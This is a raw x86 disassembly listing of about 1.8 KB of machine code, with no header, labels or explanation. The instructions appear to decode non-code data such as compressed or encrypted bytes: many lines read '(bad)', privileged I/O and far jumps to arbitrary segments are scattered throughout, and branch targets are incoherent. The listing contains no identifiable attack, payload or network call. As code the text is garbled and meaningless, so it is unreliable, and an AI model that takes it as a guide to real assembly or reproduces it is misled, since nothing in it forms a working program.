  42b68b:	push   esi
  42b68c:	mov    edx,0x58ee6432
  42b691:	loopne 0x42b6aa
  42b693:	mov    ebx,ebp
  42b695:	inc    ecx
  42b696:	adc    al,0xb2
  42b698:	scas   al,BYTE PTR es:[edi]
  42b699:	imul   esi,DWORD PTR [eax-0x2f],0x4e9840a1
  42b6a0:	push   ebx
  42b6a1:	xor    BYTE PTR [edi-0x68],al
  42b6a4:	sub    eax,0xe55668bb
  42b6a9:	outs   dx,DWORD PTR ds:[esi]
  42b6aa:	pop    es
  42b6ab:	hlt    
  42b6ac:	nop
  42b6ad:	mulps  xmm5,xmm3
  42b6b0:	sbb    bp,0xafe3
  42b6b5:	pop    edx
  42b6b6:	imul   ebx
  42b6b8:	div    BYTE PTR [edi-0x76e777bf]
  42b6be:	jl     0x42b6b2
  42b6c0:	xchg   DWORD PTR [eax],ecx
  42b6c2:	lahf   
  42b6c3:	jne    0x42b689
  42b6c5:	mov    dh,0xc4
  42b6c7:	mov    dl,0x40
  42b6c9:	hlt    
  42b6ca:	push   es
  42b6cb:	loop   0x42b690
  42b6cd:	(bad)  
  42b6ce:	fldcw  WORD PTR [edi+0x82b2960]
  42b6d4:	stc    
  42b6d5:	(bad)  
  42b6d6:	jb     0x42b6bc
  42b6d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6d9:	dec    ecx
  42b6da:	imul   edx,DWORD PTR ds:[edi+0x16a204d3],0xde7da42f
  42b6e5:	mov    esp,0x842ca3e7
  42b6ea:	popf   
  42b6eb:	push   es
  42b6ec:	into   
  42b6ed:	into   
  42b6ee:	pop    ebp
  42b6ef:	leave  
  42b6f0:	xor    eax,DWORD PTR [esi+eax*4]
  42b6f3:	sbb    al,0x4e
  42b6f5:	loop   0x42b680
  42b6f7:	mov    dl,BYTE PTR [edi]
  42b6f9:	neg    BYTE PTR [edx-0x68f3a4c6]
  42b6ff:	mov    ah,0xf4
  42b701:	ret    0xfb46
  42b704:	(bad)  
  42b705:	and    al,0x44
  42b707:	xlat   BYTE PTR ds:[ebx]
  42b708:	mov    ds:0x37ea1ce6,eax
  42b70d:	sub    ah,cl
  42b70f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b710:	and    DWORD PTR [eax-0x57ba3691],0x5e
  42b717:	mov    gs,WORD PTR gs:[edi]
  42b71a:	add    BYTE PTR [edx+0x10ada0ef],al
  42b720:	cdq    
  42b721:	sub    cl,BYTE PTR [ecx+0x484b81cb]
  42b727:	jg     0x42b6ca
  42b729:	add    eax,0x90948688
  42b72e:	cmp    esp,DWORD PTR [edi]
  42b730:	push   0x2
  42b732:	rcl    edx,cl
  42b734:	pop    ss
  42b735:	in     al,0xc6
  42b737:	adc    eax,0x5f4170d1
  42b73c:	mov    edx,0xcb758d0a
  42b741:	pop    edx
  42b742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b743:	sbb    al,0xc0
  42b745:	ficomp DWORD PTR [esi+0x1db52c46]
  42b74b:	sub    DWORD PTR [ebp-0x30],edi
  42b74e:	add    bl,dl
  42b750:	cwde   
  42b751:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b753:	fst    QWORD PTR [esi]
  42b755:	xchg   esp,eax
  42b756:	call   0x67d54459
  42b75b:	dec    eax
  42b75c:	fsub   QWORD PTR [ebp-0x43]
  42b75f:	cli    
  42b760:	out    dx,al
  42b761:	xor    al,0x99
  42b763:	add    al,0xab
  42b765:	sar    edx,1
  42b767:	hlt    
  42b768:	(bad)  
  42b769:	cmp    BYTE PTR [ebx+ebx*1-0x2eb2d034],bl
  42b770:	sbb    DWORD PTR [ebp-0x1f],ebx
  42b773:	cli    
  42b774:	sbb    eax,0xbe4f87b4
  42b779:	inc    ebp
  42b77a:	push   esp
  42b77b:	dec    ecx
  42b77c:	inc    esp
  42b77d:	retf   
  42b77e:	(bad)  
  42b77f:	xchg   ebx,eax
  42b780:	nop
  42b781:	mov    edx,0x55093cfa
  42b786:	push   edi
  42b787:	shr    DWORD PTR [ecx+esi*2+0x7fdef009],1
  42b78e:	pushf  
  42b78f:	retf   0xc393
  42b792:	push   esi
  42b793:	xlat   BYTE PTR ds:[ebx]
  42b794:	(bad)  
  42b795:	pop    esi
  42b796:	sbb    DWORD PTR [edi+0x2815e55],esp
  42b79c:	pop    edx
  42b79d:	test   bl,ah
  42b79f:	call   0x69d2:0x162ccf60
  42b7a6:	int    0x87
  42b7a8:	addr16 mov ch,0xb3
  42b7ab:	stos   BYTE PTR es:[edi],al
  42b7ac:	xchg   ebx,eax
  42b7ad:	in     eax,0xa3
  42b7af:	call   0xefd1bfcb
  42b7b4:	mov    dl,0xee
  42b7b6:	inc    ebp
  42b7b7:	(bad)  
  42b7b8:	aaa    
  42b7b9:	add    BYTE PTR [edi-0x4c],0x41
  42b7bd:	adc    eax,0x7bf60006
  42b7c2:	and    esi,ebx
  42b7c4:	mov    edi,0x9f66d6bf
  42b7c9:	and    ebp,edx
  42b7cb:	rcr    BYTE PTR [ebx],0x6f
  42b7ce:	or     DWORD PTR [edi],edx
  42b7d0:	jno    0x42b804
  42b7d2:	cmp    ebx,DWORD PTR [esi]
  42b7d4:	jl     0x42b762
  42b7d6:	(bad)  
  42b7d7:	jmp    0x680fe7f8
  42b7dc:	push   ds
  42b7dd:	mov    eax,fs
  42b7df:	pop    eax
  42b7e0:	xchg   esi,eax
  42b7e1:	mov    edi,0xbae2cd54
  42b7e6:	fstp   QWORD PTR [edx-0x1fecfc5f]
  42b7ec:	(bad)  
  42b7ed:	cmp    ch,BYTE PTR [esi+0x5f79230f]
  42b7f3:	add    al,0xa9
  42b7f5:	cmc    
  42b7f6:	sbb    eax,0xffffff9f
  42b7f9:	das    
  42b7fa:	or     ah,cl
  42b7fc:	or     BYTE PTR [eax-0x45],ch
  42b7ff:	addr16 into 
  42b801:	scas   eax,DWORD PTR es:[edi]
  42b802:	test   al,0xf3
  42b804:	ss lock iret 
  42b807:	adc    al,0x98
  42b809:	idiv   DWORD PTR [ebp-0x816861d]
  42b80f:	aaa    
  42b810:	call   0xc0fa:0x68ab374
  42b817:	test   BYTE PTR [ebp+edx*1-0x8],ah
  42b81b:	nop
  42b81c:	sahf   
  42b81d:	lods   eax,DWORD PTR ds:[esi]
  42b81e:	sbb    DWORD PTR [edi+esi*1-0x63b334c1],edx
  42b825:	pop    eax
  42b826:	gs scas eax,DWORD PTR es:[edi]
  42b828:	das    
  42b829:	cs (bad) 
  42b82c:	dec    eax
  42b82d:	pop    ebx
  42b82e:	jbe    0x42b850
  42b830:	pop    ecx
  42b831:	arpl   WORD PTR [ebx+0x17],bp
  42b834:	(bad)  
  42b835:	mov    edx,0x984a488d
  42b83a:	mov    ecx,0xd70faa24
  42b83f:	inc    esi
  42b840:	aaa    
  42b841:	dec    eax
  42b842:	sub    dl,BYTE PTR [ecx-0x2]
  42b845:	push   cs
  42b846:	rcl    DWORD PTR [eax-0x3c9af3e3],1
  42b84c:	sub    DWORD PTR [edi+0x5630525e],edx
  42b852:	shr    DWORD PTR [eax-0x227d05f2],1
  42b858:	dec    esi
  42b859:	leave  
  42b85a:	xchg   BYTE PTR [ebp-0x66],al
  42b85d:	sbb    ch,ah
  42b85f:	xor    al,0x29
  42b861:	sbb    BYTE PTR [ecx+0x33],cl
  42b864:	stos   DWORD PTR es:[edi],eax
  42b865:	push   ecx
  42b866:	das    
  42b867:	cwde   
  42b868:	cmp    al,BYTE PTR [ebx+0x4279f2c6]
  42b86e:	ins    DWORD PTR es:[edi],dx
  42b86f:	aad    0x69
  42b871:	mov    ?,WORD PTR [edi-0x1d6fd2f2]
  42b877:	xchg   BYTE PTR [ebp+0x6b790152],ah
  42b87d:	std    
  42b87e:	mov    edx,0xb9786985
  42b883:	dec    ebx
  42b884:	cmp    DWORD PTR [ecx-0x54571247],eax
  42b88a:	jp     0x42b80f
  42b88c:	rcl    DWORD PTR [ecx-0x32959e7c],cl
  42b892:	retf   0x37a6
  42b895:	loopne 0x42b90d
  42b897:	mov    al,ds:0x2b0c74b
  42b89c:	mov    eax,ds:0x21e1e640
  42b8a1:	stc    
  42b8a2:	pop    edi
  42b8a3:	mov    eax,0x477056bf
  42b8a8:	pushf  
  42b8a9:	push   esp
  42b8aa:	call   0xa6d6:0xafc8679e
  42b8b1:	fadd   DWORD PTR [eax+ecx*2-0x24]
  42b8b5:	cmp    BYTE PTR [ebx],bl
  42b8b7:	push   edi
  42b8b8:	mov    BYTE PTR [edi],bl
  42b8ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b8bb:	test   DWORD PTR [ebx+eiz*2],esp
  42b8be:	xlat   BYTE PTR ds:[ebx]
  42b8bf:	pop    edx
  42b8c0:	fbstp  TBYTE PTR [esp+ebp*2]
  42b8c3:	scas   eax,DWORD PTR es:[edi]
  42b8c4:	inc    esi
  42b8c5:	mov    WORD PTR [edx-0x6dcceefe],fs
  42b8cb:	jae    0x42b937
  42b8cd:	fstp   TBYTE PTR [eax+0x67]
  42b8d0:	xchg   ebp,eax
  42b8d1:	jg     0x42b87c
  42b8d3:	fimul  DWORD PTR [ecx+0x17]
  42b8d6:	rcl    edx,cl
  42b8d8:	sbb    bl,cl
  42b8da:	iret   
  42b8db:	mov    esi,0x547141ab
  42b8e0:	jbe    0x42b8df
  42b8e2:	setnp  BYTE PTR [eax-0x6fffa19b]
  42b8e9:	loopne 0x42b924
  42b8eb:	add    esi,ebx
  42b8ed:	test   dh,al
  42b8ef:	sbb    eax,0x1d33f641
  42b8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8f5:	cmp    esp,DWORD PTR [esi-0x1e]
  42b8f8:	cs xchg edx,eax
  42b8fa:	dec    esi
  42b8fb:	fild   DWORD PTR [ebp-0x2]
  42b8fe:	and    BYTE PTR [ecx-0x73],al
  42b901:	xchg   edi,eax
  42b902:	push   cs
  42b903:	push   esp
  42b904:	pusha  
  42b905:	lods   al,BYTE PTR ds:[esi]
  42b906:	sbb    cl,bh
  42b908:	cwde   
  42b909:	push   ds
  42b90a:	cbw    
  42b90c:	dec    edx
  42b90d:	mov    WORD PTR [edx],gs
  42b90f:	add    ecx,ebp
  42b911:	adc    BYTE PTR [edx+edx*4-0x662d7577],cl
  42b918:	out    0x9,eax
  42b91a:	mov    dl,ch
  42b91c:	adc    bh,BYTE PTR [edx+0x2482cb58]
  42b922:	jb     0x42b8c4
  42b924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b925:	push   esi
  42b926:	pop    esp
  42b927:	mov    eax,0xef9e2af0
  42b92c:	mov    esi,DWORD PTR [ebp-0x4c982a5c]
  42b932:	mov    edi,0x7dde5b6a
  42b937:	xchg   esp,eax
  42b938:	int3   
  42b939:	iret   
  42b93a:	(bad)  
  42b93c:	push   ebp
  42b93d:	mov    ch,BYTE PTR [eax]
  42b93f:	ret    
  42b940:	fiadd  WORD PTR [esi]
  42b942:	xor    al,0xf7
  42b944:	jp     0x42b8ec
  42b946:	sub    bh,BYTE PTR [eax-0x1f873cde]
  42b94c:	pop    edx
  42b94d:	ja     0x42b998
  42b94f:	fist   DWORD PTR [edi]
  42b951:	dec    eax
  42b952:	iret   
  42b953:	je     0x42b8db
  42b955:	jp     0x42b8f5
  42b957:	into   
  42b958:	pushf  
  42b959:	jae    0x42b93f
  42b95b:	mov    dl,0xa
  42b95d:	push   esp
  42b95e:	jmp    0x46c7:0x81c05fde
  42b965:	mov    ecx,0xe43adc8d
  42b96a:	fucom  st(7)
  42b96c:	jl     0x42b8f8
  42b96e:	pusha  
  42b96f:	das    
  42b970:	sahf   
  42b971:	lds    esp,FWORD PTR [ebx+0x66c154f8]
  42b977:	adc    ecx,ebx
  42b979:	add    edi,eax
  42b97b:	sub    ah,BYTE PTR [edi+0x3d]
  42b97e:	frstor [eax-0x80]
  42b981:	or     edi,esi
  42b983:	addr16 out dx,eax
  42b985:	adc    DWORD PTR [ebx-0x70164350],ebp
  42b98b:	fstp   st(2)
  42b98d:	test   edx,esi
  42b98f:	mov    ss,ecx
  42b991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b992:	lods   al,BYTE PTR ds:[esi]
  42b993:	aam    0xc3
  42b995:	cli    
  42b996:	add    al,0x93
  42b998:	mov    eax,0x1b00a12
  42b99d:	repnz pop ss
  42b99f:	aaa    
  42b9a0:	mov    dl,0x5e
  42b9a2:	sbb    DWORD PTR [edx],ecx
  42b9a4:	xchg   edi,eax
  42b9a5:	jmp    0xef61:0xa78370e1
  42b9ac:	in     al,dx
  42b9ad:	(bad)  
  42b9af:	push   cs
  42b9b0:	int3   
  42b9b1:	cwde   
  42b9b2:	lods   al,BYTE PTR ds:[esi]
  42b9b3:	ss iret 
  42b9b5:	jo     0x42ba1d
  42b9b7:	mov    cl,0x6e
  42b9b9:	xchg   ebp,eax
  42b9ba:	ret    
  42b9bb:	add    al,bh
  42b9bd:	or     DWORD PTR [edx+0x12136147],edi
  42b9c3:	pop    edi
  42b9c4:	(bad)  
  42b9c5:	jp     0x42ba41
  42b9c7:	ins    DWORD PTR es:[edi],dx
  42b9c8:	mov    eax,DWORD PTR [edi+eiz*8-0x5d]
  42b9cc:	out    0x59,al
  42b9ce:	adc    al,0x3c
  42b9d0:	loopne 0x42ba04
  42b9d2:	xchg   BYTE PTR ds:0xd22c533b,al
  42b9d8:	adc    al,0x18
  42b9da:	jno    0x42ba19
  42b9dc:	xchg   esp,eax
  42b9dd:	je     0x42ba01
  42b9df:	mov    ds:0x4017ade2,eax
  42b9e4:	inc    esp
  42b9e5:	push   ecx
  42b9e6:	daa    
  42b9e7:	jl     0x42b9ae
  42b9e9:	jae    0x42ba29
  42b9eb:	daa    
  42b9ec:	jae    0x42b9d4
  42b9ee:	cmp    DWORD PTR [eax],ecx
  42b9f0:	jmp    0x42ba11
  42b9f2:	loopne 0x42ba06
  42b9f4:	adc    BYTE PTR [eax+ebp*8-0x74],dh
  42b9f8:	sub    DWORD PTR [ebp+0x28],0xaa9256a7
  42b9ff:	stos   DWORD PTR es:[edi],eax
  42ba00:	out    dx,al
  42ba01:	jg     0x42b9b7
  42ba03:	data16 jge 0x42ba05
  42ba06:	mov    ebp,0x9e9c1ab7
  42ba0b:	pop    ecx
  42ba0c:	icebp  
  42ba0d:	mov    dh,0xbc
  42ba0f:	and    dh,BYTE PTR [edi]
  42ba11:	aam    0x1b
  42ba13:	sub    al,0x85
  42ba15:	adc    al,0x5
  42ba17:	retf   0x9aa7
  42ba1a:	inc    esi
  42ba1b:	addr16 pop ecx
  42ba1d:	jp     0x42b9ff
  42ba1f:	sahf   
  42ba20:	call   0xd0d37d6b
  42ba25:	xchg   BYTE PTR [esi+0x6dcd1117],al
  42ba2b:	xor    eax,0xeae673a1
  42ba30:	push   es
  42ba31:	rcl    al,cl
  42ba33:	inc    ebx
  42ba34:	cld    
  42ba35:	ds dec eax
  42ba37:	or     BYTE PTR [eax-0x73a12f66],bh
  42ba3d:	jl     0x42ba48
  42ba3f:	add    eax,0x8687156e
  42ba44:	inc    esi
  42ba45:	in     al,0x21
  42ba47:	inc    esi
  42ba48:	sub    BYTE PTR [ebx],ah
  42ba4a:	mov    ds:0x3e112f09,al
  42ba4f:	cmp    dl,BYTE PTR [edx+0x76]
  42ba52:	mov    ecx,0x68d8b047
  42ba57:	sub    eax,0x6fe11ca2
  42ba5c:	into   
  42ba5d:	or     eax,edi
  42ba5f:	and    eax,0x5e99ec02
  42ba64:	dec    ebp
  42ba65:	cdq    
  42ba66:	lsl    esi,WORD PTR ds:0x95cb5531
  42ba6d:	retf   
  42ba6e:	ror    BYTE PTR [ebx+0x221c3d3],1
  42ba74:	int3   
  42ba75:	adc    DWORD PTR [edi+0x6c],edx
  42ba78:	and    edi,DWORD PTR [ecx-0x6c]
  42ba7b:	xor    eax,0xdd43b080
  42ba80:	sub    BYTE PTR [ebx+0x14],bh
  42ba83:	sbb    ch,BYTE PTR [ebx]
  42ba85:	sti    
  42ba86:	ffreep st(2)
  42ba88:	popf   
  42ba89:	sub    ebx,ecx
  42ba8b:	outs   dx,DWORD PTR ds:[esi]
  42ba8c:	aam    0x67
  42ba8e:	mov    DWORD PTR [eax],ebp
  42ba90:	cwde   
  42ba91:	pop    ebx
  42ba92:	or     DWORD PTR [eax+0x379c28bc],eax
  42ba98:	pusha  
  42ba99:	lock jbe 0x42baed
  42ba9c:	ret    
  42ba9d:	mov    bh,0x4f
  42ba9f:	pop    ebx
  42baa0:	(bad)  
  42baa1:	out    0x7c,al
  42baa3:	clc    
  42baa4:	add    al,0x33
  42baa6:	popfw  
  42baa8:	and    BYTE PTR [eax],bl
  42baaa:	pop    eax
  42baab:	xchg   esi,eax
  42baac:	pusha  
  42baad:	sbb    ah,BYTE PTR [ecx-0x51]
  42bab0:	mov    dh,0xbe
  42bab2:	fwait
  42bab3:	add    BYTE PTR [eax+ecx*2],dl
  42bab6:	js     0x42badd
  42bab8:	or     esi,ebp
  42baba:	xor    bl,dl
  42babc:	(bad)  
  42babd:	adc    ah,BYTE PTR [edi+0x722693f2]
  42bac3:	loope  0x42ba71
  42bac5:	jns    0x42ba59
  42bac7:	fs xor eax,0xbffb5e6a
  42bacd:	popa   
  42bace:	aam    0xf2
  42bad0:	xlat   BYTE PTR ds:[ebx]
  42bad1:	hlt    
  42bad2:	inc    ecx
  42bad3:	in     al,0x13
  42bad5:	data16 jmp 0x42bb0e
  42bad8:	sbb    DWORD PTR [esi+eiz*1-0x5f007aad],eax
  42badf:	out    dx,eax
  42bae0:	mov    edi,0x308caa4f
  42bae5:	lods   eax,DWORD PTR ds:[esi]
  42bae6:	jle    0x42baa2
  42bae8:	out    0x91,al
  42baea:	cmc    
  42baeb:	or     BYTE PTR [edi+0x2762bed7],cl
  42baf1:	scas   eax,DWORD PTR es:[edi]
  42baf2:	xlat   BYTE PTR ds:[ebx]
  42baf3:	jmp    DWORD PTR [eax-0x47]
  42baf6:	lds    ebx,FWORD PTR gs:[esi-0x12]
  42bafa:	mov    bl,0xdf
  42bafc:	int3   
  42bafd:	jo     0x42bae9
  42baff:	mov    ch,0xc
  42bb01:	aad    0x51
  42bb03:	out    dx,eax
  42bb04:	cmp    al,0x82
  42bb06:	dec    ebp
  42bb07:	mov    ah,0x22
  42bb09:	jmp    0x42bb71
  42bb0b:	dec    edx
  42bb0c:	dec    ebx
  42bb0d:	pusha  
  42bb0e:	xor    BYTE PTR [ebx-0x45a8983c],bl
  42bb14:	hlt    
  42bb15:	cmp    DWORD PTR [esi+0xc0fbe],eax
  42bb1b:	push   edx
  42bb1c:	gs fsub st,st(4)
  42bb1f:	jmp    0x3f27:0x9c70745f
  42bb26:	add    DWORD PTR [eax-0x307ddb54],esi
  42bb2c:	jge    0x42baf6
  42bb2e:	jmp    DWORD PTR [edx]
  42bb30:	xchg   BYTE PTR [esi-0xd],bl
  42bb33:	arpl   WORD PTR [edi-0x63],bx
  42bb36:	ss push 0xffffffe5
  42bb39:	es jp  0x42bb05
  42bb3c:	stos   BYTE PTR es:[edi],al
  42bb3d:	push   esi
  42bb3e:	cs pop ss
  42bb40:	dec    edi
  42bb41:	js     0x42bb2c
  42bb43:	neg    DWORD PTR [ecx]
  42bb45:	mov    edi,0x9a40ccef
  42bb4a:	jmp    0x79bd7f6e
  42bb4f:	dec    ecx
  42bb50:	inc    ebx
  42bb51:	ret    
  42bb52:	mov    ebp,0xad4282fd
  42bb57:	in     eax,0xa9
  42bb59:	mov    BYTE PTR [edi+edx*2-0x3346e479],ah
  42bb60:	cmp    al,BYTE PTR [edi+0x0]
  42bb63:	lods   al,BYTE PTR ds:[esi]
  42bb64:	pop    ebp
  42bb65:	jns    0x42bb13
  42bb67:	sub    al,0x17
  42bb69:	dec    eax
  42bb6a:	xchg   esi,eax
  42bb6b:	enter  0xc4e1,0x80
  42bb6f:	enter  0x5993,0xef
  42bb73:	or     BYTE PTR [ebp+0x41],bl
  42bb76:	mov    ebp,0xa8a75e9f
  42bb7b:	and    DWORD PTR [esi+0x35],0xffffffea
  42bb7f:	jecxz  0x42bb36
  42bb81:	stos   DWORD PTR es:[edi],eax
  42bb82:	add    ch,BYTE PTR [ebx-0x5001ace8]
  42bb88:	or     bh,BYTE PTR [ebx]
  42bb8a:	fadd   QWORD PTR [edx]
  42bb8c:	scas   eax,DWORD PTR es:[edi]
  42bb8d:	inc    edi
  42bb8e:	cdq    
  42bb8f:	pop    eax
  42bb90:	sti    
  42bb91:	jno    0x42bb71
  42bb93:	aam    0x1f
  42bb95:	ins    BYTE PTR es:[edi],dx
  42bb96:	adc    DWORD PTR [ebp-0x57],ebp
  42bb99:	mov    dl,0xfc
  42bb9b:	push   edx
  42bb9c:	xor    esp,ecx
  42bb9e:	jmp    0x5597ff3
  42bba3:	add    ecx,ecx
  42bba5:	(bad)  
  42bba6:	aam    0x9b
  42bba8:	retf   0xca96
  42bbab:	push   es
  42bbac:	xor    ebp,ebp
  42bbae:	hlt    
  42bbaf:	ss fucom st(6)
  42bbb2:	adc    ebp,DWORD PTR ds:0x11a0646a
  42bbb8:	jo     0x42bb40
  42bbba:	and    eax,DWORD PTR [ebx+0x1c]
  42bbbd:	inc    esp
  42bbbe:	imul   ebp,DWORD PTR [ecx],0x1e
  42bbc1:	xchg   dh,bh
  42bbc3:	bound  eax,QWORD PTR [esi+0x69]
  42bbc6:	sahf   
  42bbc7:	mov    al,ds:0x20a9fe06
  42bbcc:	inc    ebx
  42bbcd:	repnz daa 
  42bbcf:	jae    0x42bb66
  42bbd1:	adc    DWORD PTR [eax-0x65],edx
  42bbd4:	je     0x42bba8
  42bbd6:	ret    
  42bbd7:	pop    edi
  42bbd8:	in     al,0xe0
  42bbda:	in     eax,dx
  42bbdb:	dec    esi
  42bbdc:	push   0x5a
  42bbde:	mov    ds:0x1ae7be5e,eax
  42bbe3:	sub    BYTE PTR [esi],ch
  42bbe5:	push   cs
  42bbe6:	sub    esi,DWORD PTR [di-0x19f9]
  42bbeb:	inc    edi
  42bbec:	repz jecxz 0x42bbbf
  42bbef:	cs ja  0x35fa1a3b
  42bbf6:	rcl    bl,1
  42bbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bbf9:	out    0x8d,eax
  42bbfb:	mov    bh,0x7c
  42bbfd:	add    al,0x65
  42bbff:	inc    edi
  42bc00:	inc    ecx
  42bc01:	sbb    BYTE PTR [ebx-0x48b29a44],ah
  42bc07:	dec    ebp
  42bc08:	push   es
  42bc09:	ss mov cl,0x62
  42bc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc0d:	adc    eax,0xc5185dee
  42bc12:	adc    al,0xac
  42bc14:	out    dx,al
  42bc15:	xor    edx,DWORD PTR [ebx+edx*1-0x3a9aa668]
  42bc1c:	xchg   BYTE PTR [edx+0x3c],ah
  42bc1f:	cs dec edx
  42bc21:	inc    ecx
  42bc22:	lds    esp,FWORD PTR [edi+0x1e538ae6]
  42bc28:	mov    WORD PTR [esi-0xe],ss
  42bc2b:	stc    
  42bc2c:	sub    ebx,DWORD PTR ds:0x9a9f65c5
  42bc32:	push   ecx
  42bc34:	mov    eax,0x1a45fa26
  42bc39:	out    dx,eax
  42bc3a:	cmp    DWORD PTR [ebx+eax*2],ebx
  42bc3d:	sub    al,BYTE PTR ds:0x7dd3548
  42bc43:	cmp    dh,BYTE PTR [edx]
  42bc45:	or     ah,bl
  42bc47:	fisub  WORD PTR [edi]
  42bc49:	pop    esp
  42bc4a:	sbb    esp,ebp
  42bc4c:	sti    
  42bc4d:	fs cld 
  42bc4f:	clc    
  42bc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc51:	ss add al,0xde
  42bc54:	(bad)  
  42bc55:	xor    BYTE PTR [eax-0x5a],bl
  42bc58:	hlt    
  42bc59:	mov    eax,0xf087a946
  42bc5e:	jle    0x42bc36
  42bc60:	jge    0x42bc58
  42bc62:	rol    BYTE PTR [eax+0x2d],cl
  42bc65:	or     eax,0x33af5b29
  42bc6a:	adc    eax,0x3b8f0447
  42bc6f:	mov    esp,0xa108a167
  42bc74:	xchg   ecx,eax
  42bc75:	push   edx
  42bc76:	mov    ebx,0xd5b3b32e
  42bc7b:	sub    BYTE PTR [ecx-0x2d],ch
  42bc7e:	mov    DWORD PTR [esi+0x69],ecx
  42bc81:	mov    edi,0x924cd437
  42bc86:	xor    cl,dh
  42bc88:	addr16 pop ds
  42bc8a:	frstor [edx+0x52324d4a]
  42bc90:	and    DWORD PTR [esi],ecx
  42bc92:	dec    ecx
  42bc93:	fdiv   DWORD PTR [ebp-0x6c00fb12]
  42bc99:	add    al,0x60
  42bc9b:	and    BYTE PTR [ebp+0x74],0x7c
  42bc9f:	test   BYTE PTR [ebp+0x3f],0x1b
  42bca3:	je     0x42bd0e
  42bca5:	scas   al,BYTE PTR es:[edi]
  42bca6:	daa    
  42bca7:	dec    edi
  42bca8:	pop    eax
  42bca9:	fbstp  TBYTE PTR [ecx-0x3]
  42bcac:	xchg   esi,eax
  42bcad:	imul   edi,DWORD PTR [edx],0xa9f674ab
  42bcb3:	mov    edx,0xf2922a8c
  42bcb8:	and    al,BYTE PTR [eax]
  42bcba:	pop    ecx
  42bcbb:	ds add al,0x81
  42bcbe:	(bad)  
  42bcc0:	pushf  
  42bcc1:	jmp    0xaaf593f7
  42bcc6:	clc    
  42bcc7:	push   edx
  42bcc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcc9:	sti    
  42bcca:	sub    edi,edx
  42bccc:	sub    edi,DWORD PTR [esi+edi*1]
  42bccf:	scas   eax,DWORD PTR es:[edi]
  42bcd0:	scas   al,BYTE PTR es:[edi]
  42bcd1:	repnz mov ?,WORD PTR [edi]
  42bcd4:	lea    eax,[di+0x6807]
  42bcd9:	inc    esi
  42bcda:	(bad)  
  42bcdb:	mov    cl,BYTE PTR [ebx]
  42bcdd:	sbb    ah,BYTE PTR [edx-0x5698a216]
  42bce3:	jmp    0x42bcb4
  42bce5:	fcom   QWORD PTR [eax+0x24]
  42bce8:	sbb    BYTE PTR [ecx-0x775f84f1],0xf
  42bcef:	(bad)  
  42bcf0:	xchg   ebp,eax
  42bcf1:	int    0x94
  42bcf3:	fcom   QWORD PTR ds:0xba905308
  42bcf9:	inc    edi
  42bcfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcfb:	dec    eax
  42bcfc:	dec    eax
  42bcfd:	and    bl,bh
  42bcff:	and    BYTE PTR [ebx],dl
  42bd01:	aad    0x51
  42bd03:	pop    esp
  42bd04:	(bad)  
  42bd05:	jns    0x42bd34
  42bd07:	adc    eax,0x5eb95aea
  42bd0c:	out    dx,al
  42bd0d:	or     ch,BYTE PTR [ebx+eax*8]
  42bd10:	clc    
  42bd11:	sub    cx,WORD PTR [eax]
  42bd14:	hlt    
  42bd15:	mov    ds,WORD PTR [ecx]
  42bd17:	and    al,0x5e
  42bd19:	push   0x3a
  42bd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd1c:	aaa    
  42bd1d:	mov    al,0x87
  42bd1f:	lahf   
  42bd20:	gs ds es jg 0x42bd44
  42bd25:	imul   ecx,DWORD PTR [esi],0x7a
  42bd28:	ret    0xe4d6
  42bd2b:	push   ebx
  42bd2c:	dec    ebx
  42bd2d:	maxps  xmm4,XMMWORD PTR [eax]
  42bd30:	dec    ecx
  42bd31:	int3   
  42bd32:	cmp    bh,bl
  42bd34:	(bad)  
  42bd36:	or     al,0xde
  42bd38:	sahf   
  42bd39:	jbe    0x42bdad
  42bd3b:	inc    edi
  42bd3c:	push   0xffffffe2
  42bd3e:	xor    DWORD PTR [edx-0x27fa4aaf],esp
  42bd44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd45:	sub    DWORD PTR [eax-0x7e],0x7a
  42bd49:	(bad)  
  42bd4b:	xor    DWORD PTR [ebp-0x2caf25d],esi
  42bd51:	push   eax
  42bd52:	popf   
  42bd53:	sub    DWORD PTR [ecx+ebx*8],0x1049197d
  42bd5a:	mov    ecx,0xdb358e99
  42bd5f:	mov    edx,0x5b5ef353
  42bd64:	push   ss
  42bd65:	ins    BYTE PTR es:[edi],dx
  42bd66:	shr    BYTE PTR [edx+0x72fdc5c2],cl
  42bd6c:	outs   dx,DWORD PTR ds:[esi]
  42bd6d:	or     BYTE PTR [edx+0x36],dh
  42bd70:	bound  eax,QWORD PTR [ecx+0x3c]
  42bd73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd74:	mov    ah,0xc4
  42bd76:	adc    al,0x2d
  42bd78:	icebp  
  42bd79:	out    0xf1,al
  42bd7b:	test   DWORD PTR [ebp+0x3a],edi
  42bd7e:	pop    ebp
  42bd7f:	aad    0xe4
  42bd81:	test   al,0xec
  42bd83:	mov    ah,0x15
  42bd85:	mov    es,WORD PTR [eax-0x63]
  42bd88:	jmp    0x42bd28
  42bd8a:	mov    ebp,0x58b34268
  42bd8f:	retf   0xd1dd
  42bd92:	push   es
  42bd93:	pop    esp
  42bd94:	test   al,0xe1
  42bd96:	pop    esi
  42bd97:	sbb    eax,0x4cc3103f
  42bd9c:	mov    bh,0xc9
  42bd9e:	add    al,0x3c
  42bda0:	lods   eax,DWORD PTR ds:[esi]
  42bda1:	jb     0xd66d6c53
  42bda7:	dec    eax
  42bda8:	sub    eax,0x7362bed3
  42bdad:	xchg   ebx,eax
  42bdae:	push   esp
  42bdaf:	scas   al,BYTE PTR es:[edi]
  42bdb0:	or     ah,BYTE PTR [eax+0x78]
  42bdb3:	mov    ecx,0xa7a70133
  42bdb8:	sub    esi,DWORD PTR [edx-0x1cbfe453]
